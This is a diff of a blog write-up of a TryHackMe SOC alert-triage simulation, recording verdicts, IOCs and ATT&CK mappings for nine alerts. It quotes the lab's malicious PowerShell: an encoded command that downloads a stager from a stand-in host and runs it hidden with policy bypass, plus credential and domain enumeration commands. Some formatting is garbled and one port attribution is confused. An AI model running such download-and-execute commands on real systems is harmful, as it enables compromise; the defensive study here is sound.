@@ -26,6 +26,7 @@ import LinkCard from "../../components/mdx/LinkCard.astro";
 
 ## Important Notes:
 
+That was my first CTF and first simulated medium difficulty SOC Alert Triaging. Even if the success rate indicates the understanding of True Positives and False Positives, the understanding of the kill chain was lacking. Another version of this writeup with a deeper investigation might be released. 
 
 ---
 ## Objective
@@ -37,14 +38,14 @@ import LinkCard from "../../components/mdx/LinkCard.astro";
 
 ---
 
-We are tasked with 9 alerts (3 critical and 6 high severity). We receive 4 high severity alerts first, then a critical one. For this exercise, I want to choose the highest severity first and then the oldest alert. That will be the order of the whole exercise and the triage method I choose.
+We are tasked with 9 alerts (3 critical and 6 high severity) and receive 4 high severity alerts first, then a critical one. For this exercise, I want to choose the highest severity first and then the oldest alert. That will be the order of the whole exercise and the triage method I choose.
 
 ## First Alert - 6355 (Anomalous Credential Vault Access)
 
 ![](../../assets/Pasted%20image%2020261022192315.png)
 ![](../../assets/Pasted%20image%2020261022192322.png)
 >  **Alert & Event Metadata** 
-> * Host: `THM-MSMITH[.]tryhatmestudios[.]thm`
+> * Host: `THM-MSMITH.tryhatmestudios.thm`
 > * **Timestamp:** `10/23/2026 11:31:04.782`
 > * **Data Source:** `WinEventLog:Microsoft-Windows-Sysmon/Operational`
 > * **Event ID:** `1` (Process Create)
@@ -118,15 +119,23 @@ In this case we can assume that the attacker is trying to do an internal reconna
 
 #### Verdict - 6355 (Anomalous Credential Vault Access)
 
+Description: The malicious file `svchost_update.ps1` from Temp folder tried to steal credentials to obtain ways to do lateral movement.
+Timestamp: `10/23/2026 11:31:04.782`
+User: TRYHATME\m.smith
+Asset: THM-MSMITH.tryhatmestudios.thm
+List of IOCs: 
+- C:\Users\MC0CD~1.SMI\AppData\Local\Temp\svchost_update.ps1
+- C:\Windows\Sysnative\vaultcmd.exe /listcreds:Windows Credentials
+
 The following methods were identified:
 
 **Masquerading** (`svchost.exe`)
-- **Technique:** T1036 
-- **Sub-technique:** T1036.005 (Match Legitimate Name or Location)
+- ****Technique**:** T1036 
+- ****Sub-****Technique**:** T1036.005 (Match Legitimate Name or Location)
 
 **Execution via Command and Scripting Interpreter**
-- **Technique:** T1059 (Command and Scripting Interpreter)
-- **Sub-technique:** T1059.001 (PowerShell)
+- ****Technique**:** T1059 (Command and Scripting Interpreter)
+- ****Sub-****Technique**:** T1059.001 (PowerShell)
 
 <Success>True Positive case. Escalation needed for further investigation. </Success>
 
@@ -134,7 +143,7 @@ The following methods were identified:
 ![](../../assets/Pasted%20image%2020261022192358.png)
 ![](../../assets/Pasted%20image%2020261022192407.png)
 > **Alert & Event Metadata**
-> - **Host:** `THM-SREYES[.]tryhatmestudios[.]thm`
+> - **Host:** `THM-SREYES.tryhatmestudios.thm`
 > - **Timestamp:** `10/23/2026 11:46:30.782`
 > - **Data Source:** `WinEventLog:Microsoft-Windows-Sysmon/Operational`
 > - **Event ID:** `3` (Network connection detected)
@@ -161,26 +170,55 @@ The following methods were identified:
 
 #### Overview Investigation
 
+First, the description of the alert states: 
+"_The analyst must establish what the archive contained, which process opened the connection, and whether the destination is a known and approved service before reaching a verdict._"
 
+Which means Playbook is available and must be used during the investigation to correctly decide the verdict for this alert.
 
+**The playbook given by the simulation**
 
-
-
-
+![](../../assets/Pasted%20image%2020261023170315.png)
+#### Review Connections - Playbook first step
+Let's check the legitimate connections first before doing anything else.
+We are going to use the internal TryDetectThis platform given by the simulation but also try some external tools such as AbuseIPDB for a deeper investigation.
 ![](../../assets/Pasted%20image%2020261022192348.png)
 
-![](../../assets/Pasted%20image%2020261022192453.png)
+The internal tools states that the `45[.]147[.]230[.]131` IP analysis is clean which in that case means not malicious.
 
+Let's also try AbuseIPDB.
 ![](../../assets/Pasted%20image%2020261022192521.png)
+
+Again, 0% low risk. But that doesn't automatically means safe or non malicious. Aurologic could be a legit service with a newly infected machine for example that's why we have to investigate the Behaviour to completely understand the issue.
+
+Besides IPs, we have to check the ports to see which services are requesting and transferring data to.
+The alert gives us two ports:
+
+| Destination Port | Source Port |
+| ---------------- | ----------- |
+| 8067             | 52624       |
+The ports are highly suspicious, there is no reason to use this two ports for.
+Port **8067** = **Non-Standard Port:** Port 8067 is an unassigned/custom port frequently leveraged by threat actors for out-of-band C2 communications and data transfer.
+Port **52624** = **Ephemeral / Dynamic Port:** Automatically assigned by the Windows TCP/IP stack for an outbound client session. This is standard OS behavior.
+So no reason for the connection to be happening other than Exfiltration.
 
 #### Verdict - 6360 (Suspicious External Connection Following Archive Creation)
 
+Description: The attacker is trying to deliver data to the C2 Server via port 52624.
+Timestamp: `10/23/2026 11:46:30.782`
+User: NT AUTHORITY\SYSTEM
+Asset: THM-SREYES.tryhatmestudios.thm
+List of IOCs: 
+- 45[.]147[.]230[.]131[:]8067
 
+The following methods were identified:
 
+**Exfiltration Over Alternative Protocol**
+- ****Technique****: T1048 (Exfiltration Over Alternative Protocol)
+- ****Sub-****Technique****: T1048.003 (Exfiltration Over Unencrypted Non-C2 Protocol)
 
+<Success>True Positive case. Escalation needed for further investigation. </Success>
 
-
-
+## Third Alert - 6358 (Suspicious External Connection Following Archive Creation)
 
 ![](../../assets/Pasted%20image%2020261022194450.png)![](../../assets/Pasted%20image%2020261022194501.png)
 > **Alert & Event Metadata**
@@ -209,15 +247,39 @@ The following methods were identified:
 > **Detection Context**
 > - **Description**: This detection fires when a host transmits data to an external destination around the time an archive file is created locally. Connections to the same destination are grouped, so an alert may represent several connections rather than one, and the analyst is expected to establish how many occurred and over what interval. Archive creation followed by an outbound transfer matches the pattern used to move collected data out of an environment, but it also matches routine backup, telemetry, and vendor integration traffic. The analyst must establish what the archive contained, which process opened the connection, and whether the destination is a known and approved service before reaching a verdict.
 
+#### Overview Investigation
+Similar to the last alert, we receive an connection tagged as Exfiltration which, based on the playbook before, we need to make sure that connections are legitimate.
 
+We are going to look at the IPs and Ports, starting with the destination IP, let's use the internal tools first:
+![](../../assets/Pasted%20image%2020261023175733.png)
 
-
-
-
-
-
+As before, clean doesn't doesn't mean non malicious. It could be an newly infected machine, service or other instances that can return the report as being clean.
+Let's gather more information on AbuseIPDB for example:
 ![](../../assets/Pasted%20image%2020261022194953.png)
+We can see the service as being whitelisted. Which is a really good indicator of the legitimacy of the service but not of the attack. It could be again, a newly infected machine inside the service. Which is rare on the highly respectable services such as cloudflare[.]com, but you have to be aware of the fact that even the most trusted services could be infected at some point.
 
+The IP is legit, but what about the ports? In the last alert we saw that even on 0% risk we can have an infected machine, maybe could be the same thing here.
+
+Ports provided:
+`443`= Typical HTTPS port used by the company.
+`56222` = Port **56222** belongs to the dynamic/ephemeral port range (49152–65535). It is not officially assigned by IANA (Internet Assigned Numbers Authority) to any specific public service.
+BUT, it is used in software development, port **56222** is commonly recognized as a port used by the **Visual Studio Tools for Unity extension** for internal messaging and debugging.
+
+Which matches the simulation internal structure:
+"_TryHatMe Studios is an up-and-coming software development house, specialising in a range of applications, from games to utilities, known for previous releases such as "CyberHeist" and the highly anticipated platformer "NeuralNexus"._"
+
+![](../../assets/Pasted%20image%2020261023180548.png)
+This checks the internal structure of the service. With no further need for investigation.
+#### Verdict - 6358 (Suspicious External Connection Following Archive Creation)
+
+Asset: THM-SREYES.tryhatmestudios.thm 
+User Context: NT AUTHORITY\SYSTEM
+Time: `10/23/2026 11:43:34.782`
+The IPs and Ports matches the internal working service of Game Development server hosting with CloudFlare. Overall, the verdict is:
+
+<Error> False Positive </Error>
+
+## Fourth Alert - 6357 (Suspicious Remote Logon and Service Creation)
 ![](../../assets/Pasted%20image%2020261022195245.png)
 ![](../../assets/Pasted%20image%2020261022195255.png)
 > **Alert & Event Metadata**
@@ -240,15 +302,45 @@ The following methods were identified:
 > 
 > **Detection Context**
 > - **Description**: This detection fires when a new Windows service is registered on a host and its configured binary path does not resolve to a recognised service executable. Service creation is a durable execution mechanism that runs with high privilege, and software deployment tooling uses it legitimately. The analyst must inspect what the service was configured to run and how that command line was constructed, determine which account created the service and whether the registering session originated over the network or at the console, and establish whether the service started.
+#### Overview Investigation
 
+Before we go further, let's check the playbook.
+![](../../assets/Pasted%20image%2020261023181633.png)
 
+Let's begin with the service name.
+`SvcUpdate` is **not** an essential core Windows operating service. So we can already suspect the service just by the name.
+Let's also follow the executable:
+`cmd.exe /c start /b powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\svchost_update.ps1`
+Similar with the alert **#6355**, we can confidently identify the same behaviour and flags with only one more flag added: 
 
+`-NonI` which makes the powershell Non Interactable which is another obvious method to hide your shell, even if you would eliminate the Hidden flag, you couldn't interact with the powershell.
 
+#### Verdict - 6357 (Suspicious Remote Logon and Service Creation)
 
+Description:  The suspicious Temp file `svchost_update.ps1` is starting / modifying a service SvcUpdate.
+Timestamp: `10/23/2026 11:38:34.782`
+User: TRYHATME\svc-mktshare
+Asset: THM-SREYES.tryhatmestudios.thm
+List of IOCs: 
+- SvcUpdate
+- C:\Windows\Temp\svchost_update.ps1
 
+The following where identified:
 
+**Masquerading** (SvcUpdate / svchost_update.ps1)
+- ****Technique****: T1036 (Masquerading)
+- ****Sub-****Technique****: T1036.005 (Match Legitimate Name or Location)
 
+**Execution via Command and Scripting Interpreter** (Windows Command Shell)
+- ****Technique****: T1059 (Command and Scripting Interpreter)
+- ****Sub-****Technique****: T1059.003 (Windows Command Shell)
 
+**Create or Modify System Process** (Windows Service)
+- ****Technique****: T1543 (Create or Modify System Process)
+- ****Sub-****Technique****: T1543.003 (Windows Service)
+
+<Success>True Positive case. Escalation needed for further investigation. </Success>
+## Fifth Alert - 6352 (Suspicious Child Process Spawned)
 ![](../../assets/Pasted%20image%2020261022195734.png)
 ![](../../assets/Pasted%20image%2020261022195743.png)
 > **Alert & Event Metadata**
@@ -290,9 +382,47 @@ The following methods were identified:
 > **Detection Context**
 > - **Description**: This detection fires when a user-facing desktop application spawns a child process. Modern office applications legitimately launch helper components, including local machine-learning and assistance features, so a match is not conclusive on its own. Where the child is a script interpreter, particularly one launched with an encoded command or with its window and execution policy suppressed, the activity warrants closer scrutiny. The analyst must inspect the path, publisher, and command line of the spawned binary, recover any concealed instructions, and determine whether code from outside the organisation has run.
 
+#### Overview Investigation
 
+Before anything, let's consult the playbook.
 
+![](../../assets/Pasted%20image%2020261023200908.png)
 
+First, we are tasked to look for `ai.exe` which is the **Original File Name**.
+We are given the hashes, so we can first check the internal platform.
+
+![](../../assets/Pasted%20image%2020261023201247.png)
+
+Clean, as before. Let's check the VirusTotal also just to make sure.
+
+![](../../assets/Pasted%20image%2020261023200733.png)
+
+Result: 0/71.
+Let's see the command line due to the playbook rule.
+
+`"C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\AI\ai.exe" "FEA77156-AD12-420B-A641-3B46EBBA133B" "89226371-A46D-4D73-8A1B-6DA74A52D901" "6184" "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" "WordCombinedFloatieLreOnline.onnx"`
+
+The `ai.exe` file is located in an legitimate path. Could just be an Microsoft Office implementation of an AI. 
+
+`WINWORD.EXE` is a legitimate executable file that start and run the Word processing program.
+
+The extension `.onnx` from the file `WordCombinedFloatieLreOnline.onnx` stands for the Open Neural Network Exchange which is an legitimate extension for an AI service.
+Also the command line is:`"C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\m.smith\Downloads\Q3_PressKit_Feedback.docm" /o ""`
+Which looks pretty clean, with no suspicious flags.
+The `Q3_PressKit_Feedback.docm` is a document with macro commands.
+But because the rest of the context is legitimate, we can assume the service is just an ai implementation.
+
+#### Verdict - 6352 (Suspicious Child Process Spawned)
+
+Description: Standard Microsoft Ai service
+Asset: THM-MSMITH.tryhatmestudios.thm
+User: TRYHATME\m.smith
+Time: `10/23/2026 11:31:00.782`
+After the investigation we can confidently say that the alert is
+
+<Error> False Positive </Error>
+
+## Sixth Alert - 6353 (Suspicious Child Process Spawned)
 ![](../../assets/Pasted%20image%2020261022200257.png)
 ![](../../assets/Pasted%20image%2020261022200306.png)
 > **Alert & Event Metadata**
@@ -321,7 +451,7 @@ The following methods were identified:
 > - **Process ID**: `8572`
 > - **Process GUID**: `{3af46175-3907-6a90-951d-000000001200}`
 > - **CommandLine**: `powershell.exe -NoP -W Hidden -Enc JABzAHQAYQBnAGUAcgAgAD0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcwB2AGMAaABvAHMAdABfAHUAcABkAGEAdABlAC4AcABzADEAIgANAAoAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AcABhAHkAbABpAG4AawAtAGMAZABuAC4AdABoAG0AOgA4ADAANgA3AC8AcwB2AGMAaABvAHMAdABfAHUAcABkAGEAdABlAC4AcABzADEAJwAsACAAJABzAHQAYQBnAGUAcgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBOAG8AUAAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBGAGkAbABlACAAYAAiACQAcwB0AGEAZwBlAHIAYAAiACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA==`
-> - **Decoded Command**: `$stager = "$env:TEMP\svchost_update.ps1"; (New-Object Net.WebClient).DownloadFile('http://paylink-cdn.thm:8067/svchost_update.ps1', $stager); Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$stager`" -WindowStyle Hidden"`
+> - **Decoded Command**: `$stager = "$env:TEMP\svchost_update.ps1"; (New-Object Net.WebClient).DownloadFile('http://paylink-cdn.thm:8067/svchost_update.ps1', $stager); Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File "$stager" -WindowStyle Hidden"`
 > - **Current Directory**: `C:\Windows\system32\`
 > - **Integrity Level**: `Medium`
 > - **Product**: `Microsoft® Windows® Operating System`
@@ -335,9 +465,69 @@ The following methods were identified:
 > **Detection Context**
 > - **Description**: This detection fires when a user-facing desktop application spawns a child process. Modern office applications legitimately launch helper components, including local machine-learning and assistance features, so a match is not conclusive on its own. Where the child is a script interpreter, particularly one launched with an encoded command or with its window and execution policy suppressed, the activity warrants closer scrutiny. The analyst must inspect the path, publisher, and command line of the spawned binary, recover any concealed instructions, and determine whether code from outside the organisation has run.
 
+#### Overview Investigation
+
+We are given the following playbook.
+![](../../assets/Pasted%20image%2020261023203604.png)
 
 
+The process is legitimate (`powershell.exe`) but worth noting just to make sure we follow the playbook. The real deal is hidden in the command line.
 
+**CommandLine**: `powershell.exe -NoP -W Hidden -Enc JABzAHQAYQBnAGUAcgAgAD0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcwB2AGMAaABvAHMAdABfAHUAcABkAGEAdABlAC4AcABzADEAIgANAAoAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AcABhAHkAbABpAG4AawAtAGMAZABuAC4AdABoAG0AOgA4ADAANgA3AC8AcwB2AGMAaABvAHMAdABfAHUAcABkAGEAdABlAC4AcABzADEAJwAsACAAJABzAHQAYQBnAGUAcgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBOAG8AUAAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBGAGkAbABlACAAYAAiACQAcwB0AGEAZwBlAHIAYAAiACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA==`
+
+Similar as before, but this time we have another `-Enc` flag.
+`-Enc` flag is executing the base64 encoded script.
+The results of the decoding, is mentioned in the summary of the alert.
+
+**Decoded Command**: `$stager = "$env:TEMP\svchost_update.ps1"; (New-Object Net.WebClient).DownloadFile('http[:]//paylink-cdn[.]thm:8067/svchost_update.ps1', $stager); Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File "$stager" -WindowStyle Hidden"
+
+So basically a script that downloads svchost_update.ps1 from the `http[:]//paylink-cdn[.]thm:8067` and hide it with Hidden flags. It will be saved in the TEMP file.
+
+We understand what is actually executing and doing, of course it is obvious that no normal user or legitimate service will encrypt in base64 an script for downloading an app from the `paylink-cdn[.]thm`. So with even without going further we can confidently say that the alert is True Positive.
+
+
+#### Verdict - 6353 (Suspicious Child Process Spawned)
+
+Description:  The attacker is establishing an connection with paylink-cdn[.]thm:8067 to get the malicious file `svchost_update.ps1` to the host via encoding the script into the command line.
+Timestamp: `10/23/2026 11:31:00.782`
+User: M.Smith
+Asset: TRYHATME\m.smith
+List of IOCs: 
+- svchost_update.ps1
+- paylink-cdn[.]thm:8067
+
+The following techniques and tactics used:
+
+**User Execution (Malicious File)**
+- ****Technique****: T1204 (User Execution)
+- ****Sub-****Technique****: T1204.002 (Malicious File)
+
+**Execution via Command and Scripting Interpreter**
+- ****Technique****: T1059 (Command and Scripting Interpreter)
+- ****Sub-****Technique****: T1059.001 (PowerShell)
+
+**Execution via Office Macro / Scripting**
+- ****Technique****: T1059 (Command and Scripting Interpreter)
+- ****Sub-****Technique****: T1059.005 (Visual Basic)
+
+**Obfuscated Files or Information (Base64 Encoded Command)**
+- ****Technique****: T1027 (Obfuscated Files or Information)
+- ****Sub-****Technique****: T1027.010 (Command Obfuscation)
+
+**Ingress Tool Transfer (Payload Download via WebClient)**
+- ****Technique****: T1105 (Ingress Tool Transfer)
+
+**Masquerading (svchost_update.ps1)**
+- ****Technique****: T1036 (Masquerading)
+- ****Sub-****Technique****: T1036.005 (Match Legitimate Name or Location)
+
+**Hide Artifacts (Hidden Window Execution)**
+- ****Technique****: T1564 (Hide Artifacts)
+- ****Sub-****Technique****: T1564.003 (Hidden Window)
+
+<Success>True Positive case. Escalation needed for further investigation. </Success>
+
+## Seventh Alert - 6356 (Rapid Domain and Host Enumeration from Non-Administrative Host)
 ![](../../assets/Pasted%20image%2020261022201303.png)
 ![](../../assets/Pasted%20image%2020261022201315.png)
 > **Alert & Event Metadata**
@@ -379,10 +569,50 @@ The following methods were identified:
 > **Detection Context**
 > - **Description**: This detection fires when a workstation that is not used for directory administration runs several domain and host enumeration commands in quick succession. The burst is aggregated, so a single alert represents the sequence rather than one execution, and the analyst is expected to recover the full set of commands issued. Administrators legitimately issue these queries, but rarely as a burst from a standard user endpoint, and the same sequence is a routine early step for a threat actor mapping an environment after gaining execution. The analyst must identify the account and the parent process behind the commands, what information they returned, and what activity followed them.
 
+#### Overview Investigation
+
+We are provided with no playbook, which is important to mention due to the process steps.
+
+The file is named `net.exe`, is a native, built-in command-line utility in Microsoft Windows used to manage network resources, user accounts, groups, services, and shared drives.
+
+Command line:
+`"C:\Windows\system32\net.exe" user /domain` could be normal, but it is really important who or what triggered the command.
+
+Let's take a look at the **Parent CommandLine**: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -ExecutionPolicy Bypass -File "C:\Users\MC0CD~1.SMI\AppData\Local\Temp\svchost_update.ps1"`
+
+The powershell executed with same flags as before, Hidden for no reason. We can already close the alert for a `True Positive` case. Also, svchost_update.ps1 appears again in the fourth alert. So in the end, the user /domain is done for the user enumartion tactic.
 
 
+#### Verdict - 6356 (Rapid Domain and Host Enumeration from Non-Administrative Host)
 
+Description:  The filed `svchost_update.ps1` moved into the MC0CD~1.SMI user and it is trying to enumerate credentials via `"C:\Windows\system32\net.exe" user /domain`.
+Timestamp: `10/23/2026 11:36:04.782`
+User: TRYHATME\m.smith
+Asset: THM-MSMITH.tryhatmestudios.thm
+List of IOCs: 
+- C:\Users\MC0CD~1.SMI\AppData\Local\Temp\svchost_update.ps1
 
+After the investigation we can list the following Techniques:
+
+**Account Discovery** (Domain Account Enumeration)
+- **Technique**: T1087 (Account Discovery)
+- **Sub-Technique**: T1087.002 (Domain Account)
+
+**Execution via Command and Scripting Interpreter**
+- **Technique**: T1059 (Command and Scripting Interpreter)
+- **Sub-Technique**: T1059.001 (PowerShell)
+
+**Masquerading** (svchost_update.ps1)
+- **Technique**: T1036 (Masquerading)
+- **Sub-Technique**: T1036.005 (Match Legitimate Name or Location)
+
+**Hide Artifacts** (Hidden Window Execution)
+- **Technique**: T1564 (Hide Artifacts)
+- **Sub-Technique**: T1564.003 (Hidden Window)
+
+<Success>True Positive case. Escalation needed for further investigation. </Success>
+
+## Eighth Alert - 6359 (Suspicious Archive Utility Execution on Workstation)
 
 ![](../../assets/Pasted%20image%2020261022201455.png)
 ![](../../assets/Pasted%20image%2020261022201504.png)
@@ -424,8 +654,52 @@ The following methods were identified:
 > 
 > **Detection Context**
 > - **Description**: This detection fires when an archive utility is executed on a workstation to compress the contents of a directory that the interactive user does not normally package. Bulk compression is how collected data is prepared before it is moved off a host, but backup and diagnostic jobs produce the same telemetry, including under automated non-interactive parents, so parent interactivity alone does not separate them. The analyst must establish what was compressed, where the archive was written, which process launched the utility, and what that same process did on the network afterwards.
+#### Overview Investigation
 
+With no playbook available for this scenario, we can decide the path we are going to take in order to decide the final verdict of the alert.
 
+The process `7z.exe` is a legitimate program to archive content, simiar to `winrar`.
+For that, we can question if the alert is based on exfiltration behaviour.
+
+The file archived is containing the build for the game. The archive contains `C:\Dev\NeuralNexus\Build\` and it is saved into `C:\Windows\Temp\nx_build_beta`. Which rises suspicions due to the path. Saving it in temp is not a common practice.
+
+**Parent CommandLine** reveals the same pattern as seen before
+**Parent CommandLine**: `powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\svchost_update.ps1`
+Hidden powershell and bypassing rules is the obvious giveaway here.
+
+#### Verdict - 6359 (Suspicious Archive Utility Execution on Workstation)
+
+Description: The archived game build located in the Windows\Temp  named `nx_build_beta.7z` is getting ready to be exfiltrated via the C2 command server based on the other alerts.
+Timestamp: `10/23/2026 11:45:25.782`
+User: NT AUTHORITY\SYSTEM
+Asset: THM-SREYES.tryhatmestudios.thm
+List of IOCs: 
+- C:\Windows\Temp\nx_build_beta.7z
+
+After the investigation we can list the following Techniques:
+
+**Execution via Command and Scripting Interpreter**
+- **Technique**: T1059 (Command and Scripting Interpreter)
+- **Sub-Technique**: T1059.001 (PowerShell)
+
+**Masquerading** (svchost_update.ps1)
+- **Technique**: T1036 (Masquerading)
+- **Sub-Technique**: T1036.005 (Match Legitimate Name or Location)
+
+**Hide Artifacts** (Hidden Window Execution)
+- **Technique**: T1564 (Hide Artifacts)
+- **Sub-Technique**: T1564.003 (Hidden Window)
+
+**Archive Collected Data** (7-Zip Utility)
+- **Technique**: T1560 (Archive Collected Data)
+- **Sub-technique**: T1560.001 (Archive via Utility)
+
+**Data from Local System** (Directory Staging)
+- **Technique**: T1005 (Data from Local System)
+
+<Success>True Positive case. Escalation needed for further investigation. </Success>
+
+## Ninth Alert - 6354 (Suspicious Outbound Connection Following Document Execution)
 ![](../../assets/Pasted%20image%2020261023133941.png)
 > **Alert & Event Metadata**
 > - **Host**: `THM-MSMITH.tryhatmestudios.thm`
@@ -445,18 +719,68 @@ The following methods were identified:
 > **Network Connection Details**
 > - **Protocol**: `tcp`
 > - **Initiated**: `true`
-> - **Source IP**: `10.60.10.22`
+> - **Source IP**: `10[.]60[.]10[.]22`
 > - **Source Port**: `54331`
-> - **Destination IP**: `45.147.230.131`
+> - **Destination IP**: `45[.]147[.]230[.]131`
 > - **Destination Port**: `8067`
 > 
 > **Detection Context**
 > - **Description**: This detection fires when a host establishes repeated outbound connections to an external address shortly after a document-handling process chain has run on that host. Connections to the same destination are aggregated, so a single alert represents a pattern rather than one connection, and the analyst is expected to establish how many occurred and over what interval. Code that has only just started executing and immediately reaches infrastructure with no business relationship to the organisation is a common indicator of command-and-control activity, though some line-of-business and update tooling behaves similarly. The analyst must identify the process that opened the connection and characterise the destination infrastructure.
 
+#### Overview Investigation
+
+This alert continues the chain of action for the last alert. The attacker is exporting the .7z file containing the build of the game to the C2 Server. The exfiltration alert was legit and only based on the alert alone we can close the ticket as being True Positive. The IP address doesn't change and we found that it is malicious.
+Using the same destination port of 8067 for the exfil is another giveaway of the kill chain action.
+We can make the triage simple, but this time I want to find patterns of C2 beaconing, the alerts are not different but part of an Kill Chain which has to be investigated.
+![](../../assets/Pasted%20image%2020261024170240.png)
+
+We can see 37 events just by that suspicious connection. 
+
+#### Verdict - 6354 (Suspicious Outbound Connection Following Document Execution)
+
+Description: PowerShell initiated an outbound callback to external C2 infrastructure (45[.]147[.]230[.]131[:]8067) to download the secondary payload (svchost_update.ps1) following macro execution.
+Timestamp: `10/23/2026 11:31:03.782`
+User: TRYHATME\m.smith
+Asset: THM-MSMITH.tryhatmestudios.thm
+List of IOCs: 
+- 45[.]147[.]230[.]131[:]8067
+
+The following methods were discovered:
+
+**Execution via Command and Scripting Interpreter**
+- **Technique**: T1059 (Command and Scripting Interpreter)
+- **Sub-technique**: T1059.001 (PowerShell)
+
+**Communication over Non-Standard Port**
+- **Technique**: T1571 (Non-Standard Port)
+
+**Exfiltration Over C2 Channel**
+- **Technique**: T1041 (Exfiltration Over C2 Channel)
+
+**Ingress Tool Transfer**
+- **Technique**: T1105 (Ingress Tool Transfer)
+
+<Success>True Positive case. Escalation needed for further investigation. </Success>
 
 
 
+## The Conclusion
 
+## Attack Narrative & Incident Timeline
+
+Based on the time and action we can make a Kill Chain of the attack.
+
+| Time (UTC)   | Host         | Alert ID | Kill Chain Phase               | Observed Activity                                                                        | Verdict  |
+| :----------- | :----------- | :------- | :----------------------------- | :--------------------------------------------------------------------------------------- | :------- |
+| **11:31:00** | `THM-MSMITH` | **6352** | Baseline Activity              | `WINWORD.EXE` launched `ai.exe` (Office AI helper).                                      | `**FP**` |
+| **11:31:00** | `THM-MSMITH` | **6353** | Initial Access & Execution     | User opened `Q3_PressKit_Feedback.docm`. Macro launched base64-encoded PowerShell.       | `**TP**` |
+| **11:31:03** | `THM-MSMITH` | **6354** | C2 & Ingress Tool Transfer     | PowerShell fetched `svchost_update.ps1` from `paylink-cdn.thm:8067` (`45.147.230.131`).  | `**TP**` |
+| **11:31:04** | `THM-MSMITH` | **6355** | Credential Access              | Stager executed `vaultcmd.exe /listcreds` to enumerate stored Windows credentials.       | `**TP**` |
+| **11:36:04** | `THM-MSMITH` | **6356** | Discovery                      | Enumerated domain accounts using `net.exe user /domain`.                                 | `**TP**` |
+| **11:38:34** | `THM-SREYES` | **6357** | Lateral Movement & Persistence | Compromised service account `svc-mktshare` ran malicious service `SvcUpdate`.            | `**TP**` |
+| **11:43:34** | `THM-SREYES` | **6358** | Baseline Activity              | Legitimate outbound HTTPS telemetry to Cloudflare CDN (`104[.]18[.]32[.]47[:]443`).      | `**FP**` |
+| **11:45:25** | `THM-SREYES` | **6359** | Collection & Staging           | Adversary ran `7z.exe` to compress `C:\Dev\NeuralNexus\Build\*` into `nx_build_beta.7z`. | `**TP**` |
+| **11:46:30** | `THM-SREYES` | **6360** | Exfiltration                   | Staged `.7z` archive exfiltrated via PowerShell to `45[.]147[.]230[.]131[:]8067`.        | `**TP**` |
 
 
 ![](../../assets/Pasted%20image%2020261022204100.png)
@@ -467,6 +791,13 @@ The following methods were identified:
 ![](../../assets/Pasted%20image%2020261022204113.png)
 
 ![](../../assets/Pasted%20image%2020261022204128.png)
+
+Some remarks.
+
+We successfully triage the True Positives and False Positives. But I didn't fully investigate what was the kill chain of action. Even identified, I could go deeper to see what happened. But that's a job for the L2 or Threat Hunter / Incident Responder. The simulation was done from the SOC L1 perspective. 
+The biggest mistake I made in that simulation was not going **deep enough** in the alerts. Even if the verdict is good, the documentation lacks the understanding of the Kill Chain.
+
+Overall a good, first CTF try without finishing the SOC L1 path from the TryHackMe yet.
 
 ----
 
